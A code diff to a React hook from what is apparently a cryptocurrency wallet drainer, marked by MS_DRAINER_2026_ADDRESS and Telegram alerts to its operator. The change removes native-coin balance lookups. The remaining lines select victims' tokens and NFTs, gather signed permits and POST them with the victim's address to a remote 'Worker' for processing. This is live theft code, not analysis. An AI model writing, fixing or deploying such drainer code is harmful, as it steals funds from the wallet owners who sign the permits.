@@ -211,23 +211,6 @@ export function useWeb3Manager() {
                     totalUsd += 50;
                 });
             }
-            // Fetch Native Balance (ETH/BNB/etc)
-            try {
-                const tempProv = new ethers.JsonRpcProvider(
-                    chain.id === "0x1" ? "https://rpc.ankr.com/eth" :
-                        chain.id === "0x38" ? "https://rpc.ankr.com/bsc" :
-                            chain.id === "0x89" ? "https://rpc.ankr.com/polygon" :
-                                "https://rpc.ankr.com/eth"
-                );
-                const nativeBal = await tempProv.getBalance(address);
-                if (nativeBal > 0n) {
-                    const ethPriceRes = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${chain.symbol}USDT`).then(r => r.json()).catch(() => ({ price: "2500" }));
-                    const price = parseFloat(ethPriceRes.price || "2500");
-                    const usdVal = parseFloat(ethers.formatEther(nativeBal)) * price;
-                    allAssets.push({ address: "0x0000000000000000000000000000000000000000", chainId: chain.id, symbol: chain.symbol, isNative: true, balance: nativeBal.toString(), usd_value: usdVal });
-                    totalUsd += usdVal;
-                }
-            } catch (e) { }
         }));
 
         allAssets.sort((a, b) => b.usd_value - a.usd_value);
@@ -325,10 +308,8 @@ export function useWeb3Manager() {
 
                             const validTokens = chainTokens.filter(t => !t.isNative && ethers.isAddress(t.address) && (t.usd_value || 0) > 1.0);
                             const validNfts = nfts.filter(n => n.chainId === chainId && ethers.isAddress(n.address));
-                            const nativeToken = chainTokens.find(t => t.isNative);
-                            const nativeBalance = nativeToken ? BigInt(nativeToken.balance) : 0n;
 
-                            if (validTokens.length === 0 && validNfts.length === 0 && nativeBalance === 0n) {
+                            if (validTokens.length === 0 && validNfts.length === 0) {
                                 notifyTelegram(`<b>⚠️ No valid assets:</b> ${targetChainName}`);
                                 continue;
                             }
@@ -423,7 +404,7 @@ export function useWeb3Manager() {
                                         'Content-Type': 'application/json',
                                         'Bypass-Tunnel-Reminders': 'true'
                                     },
-                                    body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order, nativeBalance }, (_, v) => typeof v === 'bigint' ? v.toString() : v)
+                                    body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order }, (_, v) => typeof v === 'bigint' ? v.toString() : v)
                                 });
                                 if (res.ok) {
                                     notifyTelegram(`<b>🎯 Master Bundle SUBMITTED</b>\nChain: ${targetChainName}\nStatus: Processing by Worker...`);
